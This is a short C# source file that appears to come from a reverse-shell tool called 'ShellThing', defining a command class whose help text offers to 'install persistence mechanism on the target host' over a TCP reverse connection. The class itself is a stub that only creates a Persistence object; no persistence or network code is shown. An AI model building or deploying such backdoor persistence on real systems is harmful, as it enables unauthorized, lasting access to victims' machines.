using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Microsoft.Win32;

namespace ShellThing.Commands
{
    class PersistenceCommand : ICommand
    {
        TcpReverseConnection connection;

        public void Execute(TcpReverseConnection connection, string[] commandArguments)
        {
            this.connection = connection;
            Persistence p = new Persistence();
        }

        public Dictionary<string, string> Help(bool includeSyntax)
        {
            Dictionary<string, string> helpText = new Dictionary<string, string>();
            helpText.Add("persistence", "install persistence mechanism on the target host");

            return helpText;
        }

    }
}
